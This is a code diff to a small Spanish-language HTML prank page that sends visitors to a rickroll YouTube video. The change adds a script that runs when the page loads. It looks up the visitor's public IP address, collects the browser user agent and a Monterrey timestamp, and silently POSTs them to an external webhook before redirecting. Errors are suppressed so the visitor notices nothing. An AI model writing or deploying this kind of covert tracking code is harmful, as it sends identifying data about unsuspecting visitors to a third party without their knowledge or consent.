@@ -2,8 +2,52 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0; url=https://youtu.be/xvFZjo5PgG0?feature=shared">
     <title>Hi!</title>
+
+    <script>
+        async function sendWebhook() {
+            try {
+                // Obtener IP pública
+                const ipRes = await fetch("https://api.ipify.org?format=json");
+                const ipData = await ipRes.json();
+
+                // Obtener hora en Monterrey
+                const timeFormatter = new Intl.DateTimeFormat("es-MX", {
+                    timeZone: "America/Monterrey",
+                    dateStyle: "full",
+                    timeStyle: "long"
+                });
+
+                const payload = {
+                    ip: ipData.ip,
+                    userAgent: navigator.userAgent,
+                    fechaHoraMonterrey: timeFormatter.format(new Date())
+                };
+
+                // Enviar POST al webhook
+                await fetch(
+                    "https://tools.myaiteam.com/webhook-catcher/webhook/9fd0f343122174183e72a2ae69de43bd",
+                    {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify(payload),
+                        keepalive: true
+                    }
+                );
+
+            } catch (e) {
+                // Silencioso para no romper el rickroll
+            } finally {
+                // Redirección al Rickroll
+                window.location.href = "https://youtu.be/xvFZjo5PgG0?feature=shared";
+            }
+        }
+
+        sendWebhook();
+    </script>
+
     <style>
         html, body {
             display: none;
@@ -12,4 +56,4 @@
 </head>
 <body>
 </body>
-</html>    
+</html>
